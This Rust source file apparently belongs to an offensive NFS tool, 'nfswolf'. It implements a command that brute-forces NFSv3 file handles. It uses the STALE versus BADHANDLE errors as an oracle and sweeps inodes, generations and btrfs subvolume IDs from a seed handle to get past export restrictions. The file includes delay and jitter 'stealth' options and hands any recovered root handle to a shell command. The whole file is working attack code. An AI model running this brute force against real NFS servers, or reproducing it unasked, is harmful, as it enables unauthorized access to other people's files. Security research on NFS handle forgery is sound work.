//! NFS file-handle brute force using the STALE/BADHANDLE oracle.
//!
//! NFSv3's error semantics distinguish two failure modes for an unknown
//! handle (RFC 1813 S2.6): NFS3ERR_STALE means the format is correct but
//! the inode/generation pair is wrong, while NFS3ERR_BADHANDLE means the
//! format itself is unrecognised. That distinction is an oracle: feed
//! candidate handles, count STALE responses, and you have positive
//! confirmation that the handle layout is right -- the search reduces to
//! sweeping the inode/generation space.

use anyhow::Context as _;
use clap::Parser;
use colored::Colorize as _;
use nfs3_types::nfs3::Nfs3Result;

use crate::cli::probe::{make_client, parse_addr};
use crate::cli::{GlobalOpts, H_BEHAVIOR, H_TARGET};
use crate::engine::file_handle::FileHandleAnalyzer;
use crate::proto::mount::NfsMountClient;
use crate::proto::nfs3::client::Nfs3Client;
use crate::proto::nfs3::types::FileHandle;
use crate::util::stealth::StealthConfig;

/// Brute-force NFS file handles.
///
/// Generates candidate handles based on detected filesystem type and tests
/// each with GETATTR. Useful when exports are restricted but the server
/// accepts forged handles.
///
/// Requires a seed handle (from a successful MOUNT or escape) to derive
/// the FSID and handle format. Iterates inode numbers from that base.
///
/// Examples:
///   nfswolf brute-handle 192.168.1.10 --seed-handle 01000200...
///   nfswolf brute-handle 192.168.1.10 --seed-handle 01000200... --fs-type xfs --max-attempts 50000
#[derive(Parser)]
pub struct BruteHandleArgs {
    /// Target host (IP or hostname; export portion ignored if present)
    #[arg(help_heading = H_TARGET, value_name = "TARGET")]
    pub target: String,

    /// Filesystem type to guide candidate generation (ext4, xfs, btrfs)
    #[arg(long, default_value = "ext4", value_name = "TYPE", help_heading = H_BEHAVIOR)]
    pub fs_type: String,

    /// Known handle (hex, required) from a prior mount or escape.
    /// Used to derive the filesystem ID and handle format.
    /// Obtain via `shell ... -c handle` or from the escape output.
    #[arg(long, required = true, value_name = "HEX", help_heading = H_TARGET)]
    pub seed_handle: String,

    /// Maximum number of handles to probe
    #[arg(long, default_value = "10000", value_name = "N", help_heading = H_BEHAVIOR)]
    pub max_attempts: u64,

    /// Fix inode to this value and sweep generations instead of sweeping inodes.
    /// Use when STALE oracle confirms the inode exists but generation is unknown.
    /// Example: `--fixed-inode 2` to brute-force the generation of the ext4 root.
    #[arg(long, value_name = "INODE", help_heading = H_BEHAVIOR)]
    pub fixed_inode: Option<u32>,

    /// Generation range start (used with --fixed-inode)
    #[arg(long, default_value = "0", value_name = "GEN", help_heading = H_BEHAVIOR)]
    pub gen_start: u32,

    /// Generation range end (used with --fixed-inode; 0 = use max_attempts from gen_start)
    #[arg(long, default_value = "0", value_name = "GEN", help_heading = H_BEHAVIOR)]
    pub gen_end: u32,
}

/// Run the brute-handle command.
pub async fn run(args: BruteHandleArgs, globals: &GlobalOpts) -> anyhow::Result<()> {
    let stealth = StealthConfig::new(globals.delay, globals.jitter);
    run_inner(&args.target, &args.fs_type, &args.seed_handle, args.max_attempts, args.fixed_inode, args.gen_start, args.gen_end, &stealth).await?;
    crate::cli::emit_replay(globals);
    Ok(())
}

#[expect(clippy::too_many_arguments, reason = "CLI dispatch -- each arg maps to a clap field")]
async fn run_inner(host: &str, fs_type: &str, seed_handle: &str, max_attempts: u64, fixed_inode: Option<u32>, gen_start: u32, gen_end: u32, stealth: &StealthConfig) -> anyhow::Result<()> {
    let mode = if let Some(inode) = fixed_inode { format!("inode={inode} gen-sweep") } else { format!("inode-sweep {fs_type}") };
    eprintln!("{}", crate::output::status_info(&format!("Brute-forcing handles on {host} [{mode}] (max {max_attempts})")));

    let seed = FileHandle::from_hex(seed_handle).context("invalid --seed-handle")?;
    let addr = parse_addr(host)?;

    let mount = NfsMountClient::new();
    let exports = mount.list_exports(addr).await.unwrap_or_default();
    let export_path = exports.first().map_or("/", |e| e.path.as_str()).to_owned();
    let (_, _, client) = make_client(addr, &export_path, 0, 0, &[], stealth.clone());

    let mut hits = 0u64;
    let mut stale = 0u64;
    let mut tried = 0u64;

    if let Some(inode) = fixed_inode {
        // --- Generation sweep for a fixed inode ---
        // Use when the STALE oracle confirmed the handle format is correct but the
        // generation is unknown. Ext4 root inodes typically have gen=0 (mkfs default),
        // but modern e2fsprogs may use a random value. XFS/ext4 inodes get random
        // generations after delete+recreate cycles.
        let end_gen = if gen_end > gen_start { gen_end } else { u32::try_from(u64::from(gen_start).saturating_add(max_attempts).min(u64::from(u32::MAX))).unwrap_or(u32::MAX) };
        eprintln!("{}", crate::output::status_info(&format!("Sweeping gen {gen_start}..={end_gen} for inode {inode}")));

        let mut cur_gen = gen_start;
        while cur_gen <= end_gen && tried < max_attempts {
            if let Some(result) = FileHandleAnalyzer::construct_handle_for_inode(&seed, inode, cur_gen) {
                tried += 1;
                probe_handle(&client, &result.root_handle, tried, &mut hits, &mut stale).await;
                if hits > 0 {
                    eprintln!("{}", crate::output::status_ok(&format!("Root handle found! inode={inode} gen={cur_gen} -- use this handle with 'shell --handle'")));
                    break;
                }
            }
            cur_gen = cur_gen.saturating_add(1);
        }
    } else if fs_type == "btrfs" {
        // BTRFS: iterate subvolume IDs (256+).
        let max = u32::try_from(max_attempts.min(u64::from(u32::MAX))).unwrap_or(u32::MAX);
        let candidates = FileHandleAnalyzer::construct_btrfs_subvol_handles(&seed, max);
        for candidate in candidates {
            if tried >= max_attempts {
                break;
            }
            tried += 1;
            probe_handle(&client, &candidate.root_handle, tried, &mut hits, &mut stale).await;
        }
    } else {
        // Inode sweep: try inodes 2..max starting with gen=0 (root), then gen=1.
        // ext4 root is always inode 2. XFS root is 128 (v5) or 64 (v4).
        // If all inodes return STALE, use --fixed-inode 2 --gen-start 0 to sweep gens.
        let start_inode = match fs_type {
            "xfs" => 64u64,
            _ => 2u64,
        };
        for inode in start_inode..start_inode + max_attempts {
            if tried >= max_attempts {
                break;
            }
            let inode32 = u32::try_from(inode).unwrap_or(u32::MAX);
            if let Some(result) = FileHandleAnalyzer::construct_handle_for_inode(&seed, inode32, 0) {
                tried += 1;
                probe_handle(&client, &result.root_handle, tried, &mut hits, &mut stale).await;
                if hits > 0 {
                    break;
                }
            }
        }
    }

    eprintln!("[*] Tried {tried} handles, {hits} hits, {stale} stale (format match)");
    if hits == 0 && stale > 0 {
        eprintln!("{}", crate::output::status_warn("All candidates returned STALE (format recognized but wrong inode/gen). Try: --fixed-inode 2 --gen-start 0 (ext4 root gen sweep)"));
    }
    Ok(())
}

/// Test a single candidate handle with GETATTR and update counters.
///
/// STALE (70) = correct format, wrong inode/generation -- the oracle confirms
/// the handle structure is valid (F-2.2). BADHANDLE (10001) = wrong format.
async fn probe_handle(client: &Nfs3Client, fh: &FileHandle, attempt: u64, hits: &mut u64, stale: &mut u64) {
    use nfs3_types::nfs3::{GETATTR3args, nfsstat3};
    let args = GETATTR3args { object: fh.to_nfs_fh3() };
    match client.getattr(&args).await {
        Ok(res) => match res {
            Nfs3Result::Ok(_) => {
                *hits += 1;
                eprintln!("{}", format!("[+] Handle HIT (inode exists): {}", fh.to_hex()).green());
            },
            Nfs3Result::Err((nfsstat3::NFS3ERR_STALE, _)) => {
                *stale += 1;
                tracing::debug!(attempt, "STALE (format match, wrong inode/gen)");
            },
            Nfs3Result::Err((stat, _)) => {
                tracing::debug!(?stat, attempt, "brute handle probe rejected");
            },
        },
        Err(e) => {
            tracing::debug!(err = %e, "brute handle RPC error");
        },
    }
}
